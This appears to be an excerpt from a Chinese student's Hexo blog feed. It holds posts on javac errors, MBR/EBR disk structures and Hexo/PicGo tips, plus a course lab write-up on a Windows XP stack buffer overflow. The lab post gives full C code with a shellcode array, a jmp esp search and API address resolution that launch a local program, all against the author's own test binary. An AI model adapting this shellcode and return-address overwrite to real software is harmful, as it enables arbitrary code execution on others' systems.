    <content><![CDATA[<h1 id="记一下常见的编译遇到的问题"><a href="#记一下常见的编译遇到的问题" class="headerlink" title="记一下常见的编译遇到的问题"></a>记一下常见的编译遇到的问题</h1><p>在使用 javac 编译器编译源代码文件时，可能会出现下面几个常见问题。</p>
<a id="more"></a>
<p>(1) Error:cannot read:HelloJava.java javac。<br>工具程序找不到指定的 java 文件，需要检查文件是否存储在当前目录中，或文件名是否错误。</p>
<p>(2) HelloJava.java:4:class HelloJava is public,should be declared in a file named MyApplication.java。<br>源文件中类的名称和源文件名称不符，需要确定源文件名称和类名称是否相同。</p>
<p>(3) HelloJava.java:6:cannot find symbol。<br>源程序文件中某些代码部分输入错了，最常产生的原因可能是没有注意到字母的大小写。</p>
<p>(4) Javac 不是内部或外部命令、可执行程序或批量文件。<br>path 设置有误或没有在 path 系统变量中加入 JDK 的 bin 目录。</p>
<p>如果没有出现上述所列问题，即成功编译了该 Java 文件。在解释执行 .dass 文件时，可能会出现下面几个常见问题。</p>
<p>(1) Exception in thread “main” java.lang.NoClassDe£FoundError。<br>Java 工具程序找不到所指定的 .class 类，需要确定指定的类是否存储在当前目录中，名称是否正确。</p>
<p>(2) Exception in thread “main” java.lang.NoSuchMetliodError:main。<br>没有指定 Java 程序的入口。Java 工具程序指定的类必须有一个程序入口，也就是必须包括 main(String args[]) 这个方法。</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>MBR和EBR</title>
    <url>/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这个的原因是做病毒实验（没错，又是病毒实验-_-）划分磁盘分区的时候，看老师的讲解视频看的一头雾水。她实在是太能折腾了，绕来绕去一大堆就为了讲一句话，头疼。防止以后忘了，写一笔（我可不想再被折磨一次）。</p>
<a id="more"></a>
<p>感谢两位大佬的文章：</p>
<a href="http://www.soilhead.cn/post-51.html" title target>cazure</a>以及<a href="https://www.cnblogs.com/april30138/p/3924930.html" title target>叶子清风</a>
<h1 id="1、MBR"><a href="#1、MBR" class="headerlink" title="1、MBR"></a>1、MBR</h1><h2 id="硬盘结构"><a href="#硬盘结构" class="headerlink" title="硬盘结构"></a>硬盘结构</h2><p>要提MBR和EBR那就绕不过硬盘结构这坎儿，硬盘有很多盘片组成，每个盘片的每个面都有一个读写磁头。如果有N个盘片。就有2N个面，对应2N个磁头(Heads)，从0、1、2开始编号。每个盘片的半径均为固定值R的同心圆再逻辑上形成了一个以电机主轴为轴的柱面(Cylinders)，从外至里编号为0、1、2……。每个盘片上的每个磁道又被划分为几十个扇区(Sector)，通常的容量是512byte，并按照一定规则编号为1、2、3……形成Cylinders×Heads×Sector个扇区。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E7%A1%AC%E7%9B%98%E7%BB%93%E6%9E%84.png" class>
<h2 id="主引导扇区MBR（master-boot-record）"><a href="#主引导扇区MBR（master-boot-record）" class="headerlink" title="主引导扇区MBR（master boot record）"></a>主引导扇区MBR（master boot record）</h2><p>主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（0柱面，0磁头，1扇区）,bios在执行自己固有的程序以后就会jump到MBR中的第一条指令。将系统的控制权交由MBR来执行。在深入讨论主引导扇区内部结构的时候，有时也将其开头的446字节内容特指为“主引导记录”MBR（Master Boot Record或者Main Boot Record），其后是4个16字节的“磁盘分区表”DPT（Disk Partition Table），以及2字节的结束标志（55AA）。因此，在使用“主引导记录”（MBR）这个术语的时候，需要根据具体情况判断其到底是指整个主引导扇区，还是主引导扇区的前446字节。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/MBR%E6%95%B0%E6%8D%AE%E6%9E%84%E6%88%90.png" class>
<p>对于硬盘而言，一个扇区可能的字节数为128×2n (n=0,1,2,3)。大多情况下，取n=2，即一个扇区(sector)的大小为512字节。在总共512byte的主引导记录中，MBR的引导程序占了其中的前446个字节(偏移0H ~ 偏移1BDH)，随后的64个字节(偏移1BEH~偏移1FDH)为DPT(Disk PartitionTable，硬盘分区表)，最后的两个字节“55 AA”(偏移1FEH ~ 偏移1FFH)是分区有效结束标志。</p>
<p>利用WinHex查看最开始的512B</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/MBR%E6%95%B0%E6%8D%AE%E8%AF%A6%E6%83%85.png" class>
<h2 id="启动代码-boot"><a href="#启动代码-boot" class="headerlink" title="启动代码 boot"></a>启动代码 boot</h2><p> 主引导记录最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。 它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。MRB的引导代码是计算机系统的关键，如果这个不能正常工作系统就启动不了。</p>
<h2 id="硬盘分区表-DPT（Disk-Partition-Table）"><a href="#硬盘分区表-DPT（Disk-Partition-Table）" class="headerlink" title="硬盘分区表 DPT（Disk Partition Table）"></a>硬盘分区表 DPT（Disk Partition Table）</h2><p>硬盘分区表占据主引导扇区的64个字节(偏移01BEH–偏移01FDH)，可以对四个分区的信息进行描述，其中每个分区的信息占据16个字节。具体每个字节的定义可以参见硬盘分区结构信息。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/DPT%E8%AF%A6%E8%A7%A3.png" class>
<p>举个栗子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windwos（0x1be - 0x1cd）： 80 01 01 00   07 FE FF FF    3F 00 00 00   00 34 80 0C </span><br><span class="line"></span><br><span class="line">	80：表示该分区为活动分区</span><br><span class="line"></span><br><span class="line">	01 01 00：开始磁头&#x2F;开始扇区和开始柱面</span><br><span class="line"></span><br><span class="line">	07 ：文件系统标志位  07表示NTFS文件系统(文件系统标记.jpg)</span><br><span class="line"></span><br><span class="line">	FE FF FF ：结束磁头&#x2F;结束扇区和结束柱面</span><br><span class="line"></span><br><span class="line">	00 00 00 3F ：分区起始的相对扇区号</span><br><span class="line"></span><br><span class="line">	0C 80 34 00：分区总的扇区数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux    （0x1be - 0x1cd）： 00 00 01 40    83 00 81 7C    00 08 00 00    81 47 12 00</span><br><span class="line"></span><br><span class="line">    00 ：表示该分区为非活动分区</span><br><span class="line"></span><br><span class="line">    00 01 40：开始磁头&#x2F;开始扇区和开始柱面</span><br><span class="line"></span><br><span class="line">    83：文件系统标志位  83表示EXT文件系统(文件系统标记.jpg)</span><br><span class="line"></span><br><span class="line">    00 81 7C：结束磁头&#x2F;结束扇区和结束柱面</span><br><span class="line"></span><br><span class="line">    00 08 00 00：分区起始的相对扇区号</span><br><span class="line"></span><br><span class="line">    81 47 12 00：分区总的扇区数</span><br></pre></td></tr></table></figure>
<p> 从主引导记录的结构可以知道，它仅仅包含一个64个字节的硬盘分区表。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，最多只能识别4个主要分区（Primary partition）。<br>所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。这里就需要引出扩展分区（EBR）了。扩展分区也是主要分区的一种，但它与主分区的不同在于理论上可以划分为无数个逻辑分区。扩展分区中逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的扩展引导记录(EBR)，其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。<br>系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。</p>
<h2 id="结束标志字"><a href="#结束标志字" class="headerlink" title="结束标志字"></a>结束标志字</h2><p>结束标志字55，AA（偏移1FEH- 偏移1FFH）是MBR扇区的最后两个字节，是检验主引导记录是否有效的标志。</p>
<h2 id="电脑启动过程"><a href="#电脑启动过程" class="headerlink" title="电脑启动过程"></a>电脑启动过程</h2><p>了解了上面的东西过后，不妨来探究一下电脑的启动过程</p>
<ul>
<li>系统开机或者重启。</li>
<li>BIOS 加电自检 ( Power On Self Test – POST )。BIOS执行内存地址为 FFFF:0000H 处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件(包括内存)进行检查。</li>
<li>读取主引导记录(MBR)扇区。当BIOS检查到硬件正常并与 CMOS 中的设置相符后，按照 CMOS 中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区(也就是MBR扇区)读入内存地址为0000:7C00H 处。</li>
<li>检查0000:7DFEH-0000:7DFFH(MBR的结束标志位)是否等于 AA55H，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示”NO ROM BASIC”然后死机。</li>
<li>当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到0000:0600H处, 然后继续执行。</li>
<li>在主分区表中搜索标志为活动的分区，也就是检验磁盘分区表DPT的首字节是不是80H。如果检测到80H，则表示该分区为活动分区，将该活动分区的第一个扇区(操作系统引导记录区，Dos Boot Recorder,DBR)读入内存地址 0000:7C00H 处。</li>
<li>检查0000:7DFEH-0000:7DFFH(DBR的结束标志位)是否等于 AA55H, 若不等于则显示 : “Missing Operating System” 然后停止。</li>
<li>当检测到有分区满足要求后，MBR将控制权交给相应的活动分区。</li>
</ul>
<p>简单的说，就是BIOS -&gt; 硬盘MBR -&gt; 活动分区DBR -&gt; 操作系统这样一个过程。</p>
<h1 id="2、EBR"><a href="#2、EBR" class="headerlink" title="2、EBR"></a>2、EBR</h1><p>EBR（Extended Boot Record）则是与MBR相对应的一个概念。前边已经讲过，MBR里有一个DPT（Disk Partition Table,磁盘分区表）的区域，它一共是64字节，按每16个字节 作为一个分区表项，它最多只能容纳4个分区。能够在MBR的DPT里进行说明的分区称为主分区。如果我们想分区多于4个的时候，MBR的DPT里就会容纳不下来，于是微软就想出了另一个解决方案，在MBR里，只放不多于三个主分区（通常只放一个）剩下的分区，则由与MBR结构很相像的另一种分区结构（EBR，也就是扩展分区引导记录）里进行说明。一个EBR不够用时，可以增加另一个EBR，如此像一根根链条一样地接下去，直到够用为止。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA.png" class>
<p>如图，未被浅色边框框柱的部分为主分区，被框住的则为拓展分区</p>
<h2 id="拓展分区引导记录"><a href="#拓展分区引导记录" class="headerlink" title="拓展分区引导记录"></a>拓展分区引导记录</h2><img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E5%9B%9B%E5%88%86%E5%8C%BA.png" class><img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E9%93%BE%E6%8E%A5.png" class>
<p>关于它们之间的链式结构主要体现在所有的拓展分区引导记录里的开始地址都是相对于第一个拓展分区的开始地址而言的相对地址，如：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/EBR%E4%BE%8B%E5%AD%90.png" class>
<p>这是一个拓展分区引导记录里的下一个EBR的开始地址，这是一个相对地址，它等于真正的地址-第一个拓展分区EBR的开始地址。或者说，<font color="red">真实地址=相对地址+第一个拓展分区EBR的开始地址</font>，当EBR中出现下图的情况时就表明没有拓展分区了</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E5%AE%8C%E7%BB%93.png" class>
<p>最后附上文件系统标记</p>
<img data-src="/hexo-test/Information-Security-Study/Others/MBR%EF%BC%86EBR/%E6%96%87%E4%BB%B6%E6%A0%87%E8%AE%B0.png" class>
<h1 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h1><p>病毒这玩意着实难搞，什么都得会点，但也正是因为要记的东西太多了，脑子容易宕机，所以才萌生了些Blog的想法，也不全是坏事^_^</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo使用技巧</title>
    <url>/hexo-test/Others/HexoUseskill/</url>
    <content><![CDATA[<p>到头来仔细一想，反正什么都要写，为什么不把Hexo的标签做个记录呢~省的到时候每次用还得去官网扒拉^_^</p>
<a id="more"></a>

<h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt; &#x2F;&#x2F;创建新的文章或者新页面</span><br><span class="line">						  &#x2F;&#x2F;:title	标题（小写，空格将会被替换为短杠）</span><br><span class="line">						&#x2F;&#x2F;:year	建立的年份，比如， 2015</span><br><span class="line">						&#x2F;&#x2F;:month	建立的月份（有前导零），比如， 04</span><br><span class="line">						&#x2F;&#x2F;:i_month	建立的月份（无前导零），比如， 4</span><br><span class="line">						&#x2F;&#x2F;:day	建立的日期（有前导零），比如， 07</span><br><span class="line">						&#x2F;&#x2F;:i_day	建立的日期（无前导零），比如， 7</span><br></pre></td></tr></table></figure>
<h2 id="文章属性的设置-Front-matter"><a href="#文章属性的设置-Front-matter" class="headerlink" title="文章属性的设置(Front-matter)"></a>文章属性的设置(Front-matter)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">layout	布局	</span><br><span class="line">title	标题	文章的文件名</span><br><span class="line">date	建立日期	文件建立日期</span><br><span class="line">updated	更新日期	文件更新日期</span><br><span class="line">comments	开启文章的评论功能	true</span><br><span class="line">tags	标签（不适用于分页）	</span><br><span class="line">categories	分类（不适用于分页）	</span><br><span class="line">permalink	覆盖文章网址	</span><br><span class="line">keywords	仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</span><br></pre></td></tr></table></figure>
<p>关于配置多个标签和分类的情况，可以使用类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tags:</span><br><span class="line">- tag1</span><br><span class="line">- tag2</span><br><span class="line">categories:</span><br><span class="line">- [Diary, PlayStation] &#x2F;&#x2F;Diary为父类,PlayStation为子类</span><br><span class="line">- [Diary, Games]</span><br><span class="line">- [Life]</span><br></pre></td></tr></table></figure>

<h2 id="使用-PicGo-作为博客的图片仓库"><a href="#使用-PicGo-作为博客的图片仓库" class="headerlink" title="使用 PicGo 作为博客的图片仓库"></a>使用 PicGo 作为博客的图片仓库</h2><p>首先下载 PicGo 的客户端：<a href="https://github.com/PicGo/Awesome-PicGo" target="_blank" rel="noopener">PicGo下载链接</a></p>
<p><img data-src="https://i.loli.net/2021/01/23/rAn68dLF2i7b1U5.png" alt="image-20210123165336572"></p>
<p>点击进去过后选择自己想要的版本（建议直接最新版^^）</p>
<p>下载完成后安装，打开后安装后续使用到的插件，建议在线安装（也就是在客户端里安装，比较快）</p>
<p>插件名：sums-user 、autocopy（这个 markdown 编辑器使用的是 Typora 的可以不用下）</p>
<p><img data-src="https://i.loli.net/2021/01/23/l68poKhmsYwPM4G.png" alt="image-20210123165555476"></p>
<p>下载完毕后注册 sm.ms 会员 <a href="https://sm.ms/" target="_blank" rel="noopener">注册</a></p>
<p>注册完毕后进入到自己的个人空间，选择 API Token </p>
<p><img data-src="https://i.loli.net/2021/01/23/9aJMoHEz6rDCvl3.png" alt="image-20210123170010677"></p>
<p>获得你的 API Access 码，之后进入到 PicGo 的客户端，将 API Access 码填入并设置为默认图床</p>
<p><img data-src="https://i.loli.net/2021/01/23/n1JMzQgk4E53tdI.png" alt="image-20210123170122463"></p>
<p>之后进行 Typora 的图片上传设置，进入设置选择图像栏，文件操作选择上传图片，上传服务选择 PicGo(app) ，位置就是你刚才安装的位置，设置完毕过后点验证试试</p>
<p><img data-src="https://i.loli.net/2021/01/23/gcD7PsVKxYFSd2J.png" alt="image-20210123170231214"></p>
<p>对于本来写了博客但是图片地址用的自己的相对路径的 Bloger ，就需要自己一张张的进行上传操作了</p>
<p><img data-src="https://i.loli.net/2021/01/23/3VMy2lASQTc1bez.png" alt="image-20210123170603118"></p>
<p>上传成功后无需进行其他操作，Typora 会自动的将图片链接替换为网络地址</p>
<h2 id="在进行文章的部署和编译时遇到nunjucks-error"><a href="#在进行文章的部署和编译时遇到nunjucks-error" class="headerlink" title="在进行文章的部署和编译时遇到nunjucks error"></a>在进行文章的部署和编译时遇到nunjucks error</h2><p>这个错误是因为文章里出现了一些类似｛｛｝｝的内容什么的（比如我现在打出的这个，，，，然后 hexo 的文章渲染使用的是 <code>Nunjucks</code> ，他会将那几个大括号识别成自己的语法，，这样生成的时候就会报错，，，</p>
<p>修改方法是避免将两个大括号连着写。比如把｛｛｝｝改成{空格{ }空格}</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title>记病毒缓冲区溢出实验</title>
    <url>/hexo-test/Information-Security-Study/Others/Virus/</url>
    <content><![CDATA[<h1 id="1、缓冲区溢出"><a href="#1、缓冲区溢出" class="headerlink" title="1、缓冲区溢出"></a>1、缓冲区溢出</h1><h2 id="1-1缓冲区溢出条件："><a href="#1-1缓冲区溢出条件：" class="headerlink" title="1.1缓冲区溢出条件："></a>1.1缓冲区溢出条件：</h2><p>1.使用非类型安全的语言（C或者C++），当缓冲区操作时不对边界做出检查，WHAT？通俗的说就是strcpy，memcpy等串操作和内存块拷贝操作缓冲区时，大数据往小空间上拷贝，造成溢出。<br>2.函数调用时栈空间的布局为缓冲区溢出提供了条件</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80.png" class title="栈空间布局">

<p>当程序中函数被调用时，系统总是先将被调用函数所需的参数以逆序的方式入栈，然后将调用函数后面那条指令的地址（返回地址）入栈。随后控制转入被调用的函数去执行，程序一般在将需要保存的寄存器的值入栈后开始为被调用函数内的局部变量分配所需的存储空间，从而形成图示堆栈结构。<br>3.如上图，局部变量如果是字符串数组，在进行缓冲区空间分配时，栈内同样符合小端方式对齐的原则，即shellcode[0]在最低端地址上，shellcode[100]在高端地址上，由于被调函数的局部变量分配在返回地址EIP（附近如下图所示：），所以一旦发生溢出，EIP就会被覆盖掉，从而导致程序的运行流程发生变化。</p>
<a id="more"></a>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86.png" class title="缓冲区溢出原理">

<h2 id="结论"><a href="#结论" class="headerlink" title="结论:"></a>结论:</h2><p>由于程序缺少必要的边界检查，如果局部变量中有字符数组存在，只要赋予该数组的字符串足够长，就能将上面的返回地址覆盖掉。字符数组超出了开始为其分配的空间大小，缓冲区溢出就发生了。<br>精心构造溢出所用的字符串，将4个字节返回地址替换成别有用心的地址，当函数返回时，我们就能引导程序到我们指定的代码去执行，从而获得程序控制权。<br>如果地址A所指定的内存空间事先存放了设计好的攻击代码，那么攻击就会随之发生。</p>
<h1 id="2、实例-用缓冲区溢出的方式打开记事本notepad"><a href="#2、实例-用缓冲区溢出的方式打开记事本notepad" class="headerlink" title="2、实例 (用缓冲区溢出的方式打开记事本notepad)#"></a>2、实例 (用缓冲区溢出的方式打开记事本notepad)#</h1><p><em>写在前面，本实例使用的是XP虚拟机</em></p>
<p>1.建工程项目，C或者C++语言，我视频讲解里是VC++6.0写的，所以还是以此介绍。<br>首先建立控制台工程，然后新建C++文件。建立好工程文件后就可以写代码了。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%A8%8B%E5%BA%8F.png" class>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%88%9B%E5%BB%BAC++%E7%A8%8B%E5%BA%8F.png" class>
<p>2.写代码，主函数很简单，仅调用一个test()函数，test函数2行代码就搞定了，用memcpy函数造缓冲区溢出，即大数据往小空间上拷贝，关键的问题是shellcode数组的构造，shellcode数组需要完成的功能是覆盖掉返回地址EIP后，转向攻击代码，即打开notepad.exe。<br>主函数仅调用test()函数，test函数就两行代码，只要shellcode的大小超过10，缓冲区溢出就发生了！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode));</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Shellcode构造：首先要理解到shellcode的功能，Shellcode是指能完成特殊任务的自包含的二进制代码，根据不同的任务可能是发出一条系统调用或建立一个高权限的Shell,  Shellcode因此得名。我们的实例中，shellcode就是要打开notepad.exe。所以如何构成这样的二进制代码，成为了关键，接触过OllyICE工具后，大家应该知道可以利用该调试工具构造二进制代码，仅需要写上对应的汇编语句。这里大家可以熟悉一下反汇编，push串对应68，push 立即数对应6A，WinExec函数地址为：7C8623AD,ExitProcess函数地址为7C81CAFA。<br> <img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%B1%87%E7%BC%96%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6.png" class><br>接下来已二进制的形式复制该段代码。粘贴到记事本上：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%AE%B0%E4%BA%8B%E6%9C%AC.png" class>
<p>然后将其书写成十六进制的样式就好了。</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6shellcode.png" class>
<p>而后编译该程序，报错是肯定的，因为我们并不清楚栈内元素的情况</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF.png" class>
<p>之后利用OllyICE进行调试</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/OllyICE%E5%B8%83%E5%B1%80.png" class>
<p>将断点放在memcpy函数调用完成的返回地址上,观察堆栈区的情况.</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/memcpy%E5%87%BD%E6%95%B0.png" class>
<p>F9跳转到改地址执行，观察堆栈区</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E5%A0%86%E6%A0%88%E5%8C%BA.png" class>
<p>现在的情况是溢出已经发生，但没有控制好溢出后的函数返回地址，让其进入了一个不能读写的地址上去执行，所以报错！<br>唯一的办法就是去耐心的反复调试。本次调试前，请先加上一组0X90（对应汇编nop，即空操作），如下：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E6%96%B0shellcode.png" class>
<p>运行，报错，0X90909090不可读！继续调试，观察堆栈区情况，返回地址为0x90909090，我们需要改写该地址才能程序进入shellcode区执行，如何填写返回地址，填写内容及位置我们就必须精心计算！返回地址可以填写0012FF88，因为函数返回后跳转到0012FF88上去执行，是一串空操作，但之后就会进入我们写的打开记事本的shellcode 区！所以动手去试下这个位置改写为0012FF88，再运行程序！</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80.png" class>
<p>观察shellcode区，Shellcode第一个有效字符为68，它之前有7个90，然后就是返回地址了，改写情况如下：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/%E8%AE%B0%E4%BA%8B%E6%9C%ACshellcode.png" class>
<p>一般来说应该是能正确执行的，执行的结果为打开本机的notepad程序</p>
<h1 id="3、推而广之"><a href="#3、推而广之" class="headerlink" title="3、推而广之"></a>3、推而广之</h1><h2 id="3-1前言"><a href="#3-1前言" class="headerlink" title="3.1前言"></a>3.1前言</h2><p>显而易见的是这样的程序通用性很差，只能在本机执行，因为其他机器的堆栈区不一定是在0012FF88后布置攻击代码。以及shellcode里面填写的0X7C8623AD,0X7C81CAFA等数据分别是XP下的WinExec和ExitProcess的函数地址。那么如何解决shellcode硬编码的问题就成了解决程序兼容性的关键！</p>
<h2 id="3-2兼容性解决"><a href="#3-2兼容性解决" class="headerlink" title="3.2兼容性解决"></a>3.2兼容性解决</h2><p><strong>第一步解决的问题是：不同机器布置攻击代码的位置不一样</strong><br>这里的解决方式是，观察函数返回后的ESP指针的情况：</p>
<img data-src="/hexo-test/Information-Security-Study/Others/Virus/ESP%E6%8C%87%E9%92%88.png" class>
<p>观察后发现函数调用返回后栈顶指针的内容恰好为0012FF88，所以如果我们想进入到该地址执行，最后是用一条指令替代硬编码地址，Jmp esp指令可以为你解决该问题。Jmp esp指令对应的二进制码为FFE4，依旧是不同的系统动态链接库并不一样，所以这里也不能使用硬编码写死，简单粗暴的方法就是在本模块中找到FFE4，而不依赖于任何的模块，找到后还是把地址回填到shellcode对应位置上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff)</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;这里的shellcode[16]根据自己的实际情况回填，他会用查询到的数据替换掉原来的数据</span><br></pre></td></tr></table></figure>
<p>剩下的WinExec和ExitProcess函数也就依葫芦画瓢，利用LoadLibrary和GetProcAddress函数来获取了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">*(DWORD*)(shellcode+46) &#x3D; a1; &#x2F;&#x2F;同样的，shellcode后面的数字根据实际情况来填</span><br><span class="line">*(DWORD*)(shellcode+55) &#x3D; a2;</span><br></pre></td></tr></table></figure>
<p>三个硬编码地址处理后，程序通用性就很好了，可以在多个版本操作系统上正常执行！</p>
<h1 id="4、后记"><a href="#4、后记" class="headerlink" title="4、后记"></a>4、后记</h1><p>先附上试验成功的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">char shellcode[]&#x3D;</span><br><span class="line">&#123; &#x2F;&#x2F;定义一个全局变量</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;0x34,0xFF,0x12,0x00,这里填的本来是一开始打开notepad的返回地址</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;24</span><br><span class="line">	0x90,0x90,0x90,</span><br><span class="line"></span><br><span class="line">	0x68,0x65,0x00,0x00,0x00,</span><br><span class="line">	0x68,0x6E,0x2E,0x65,0x78,</span><br><span class="line">	0x68,0x61,0x6F,0x72,0x61,</span><br><span class="line">	0x68,0x65,0x6E,0x67,0x68,</span><br><span class="line">	0x68,0x63,0x3A,0x2F,0x64, &#x2F;&#x2F;这一段是名字全拼.exe的十六进制编码</span><br><span class="line"></span><br><span class="line">	0x6A,0x01,0x8B, &#x2F;&#x2F;31</span><br><span class="line">	0xC4,0x83,0xC0,0x04,</span><br><span class="line">	0x50,0xB8,0x90,0x90,</span><br><span class="line">	0x90,0x90,0xFF,0xD0,</span><br><span class="line">	0x6A,0x00,0xB8,0x90,</span><br><span class="line">	0x90,0x90,0x90,0xFF,0xD0 &#x2F;&#x2F;21，两个0xFF前面四个字节都是相应的函数地址</span><br><span class="line">&#125;;</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode)); &#x2F;&#x2F;memcpy缓冲区溢出常用函数，即大数据往小空间上拷贝</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff) &#x2F;&#x2F;在本地查找0xE4FF,也就是jmp ESP指令的地址</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;保存到shellcode里面替换手动输入的返回地址</span><br><span class="line"></span><br><span class="line">	DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">	DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">	*(DWORD*)(shellcode+61) &#x3D; a1;</span><br><span class="line">	*(DWORD*)(shellcode+70) &#x3D; a2; &#x2F;&#x2F;动态获取，然后回填</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
